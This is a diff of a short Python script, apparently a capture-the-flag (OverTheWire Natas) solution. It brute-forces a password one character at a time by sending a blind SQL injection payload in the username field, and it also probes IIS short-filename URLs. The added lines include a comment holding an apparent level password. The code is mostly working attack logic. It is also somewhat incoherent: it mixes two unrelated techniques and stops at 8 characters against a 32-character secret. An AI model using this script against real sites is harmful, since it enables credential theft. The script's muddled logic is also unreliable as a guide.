@@ -1,11 +1,14 @@
 import requests
 
-chars='abcdefghijklmnopqrstuvwxyz0123456789.'
-url = 'https://www.sample.com/'
+chars='abcdefghijklmnopqrstuvwxyz0123456789._-'
+url = 'https://www.sitename.com/'
 password=''
+findch='no'
+# password is 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
 print('Scan by Bruteforce')
 
 while len(password) < 8:
+	findch='no'
 	for letter in chars:
 		myobj = {'username': 'natas16" and password like binary "'+password+letter+'%%'}
 		myurl = url+password+letter+'*~1*/a.aspx'
@@ -20,7 +23,12 @@ while len(password) < 8:
 		if 'temporarily' in x.text :
 			password +=letter
 			print('char founded: <'+letter+'> name now is :'+password)
+			findch='yes'
 			break
+	if findch =='no' :
+		print('more char not find')
+		#~1.
+	#print('findch=====',findch)
 #print(x.text)
 
-print('\n End. and File name is : '+password)
+print('\n End. and password is : '+password)
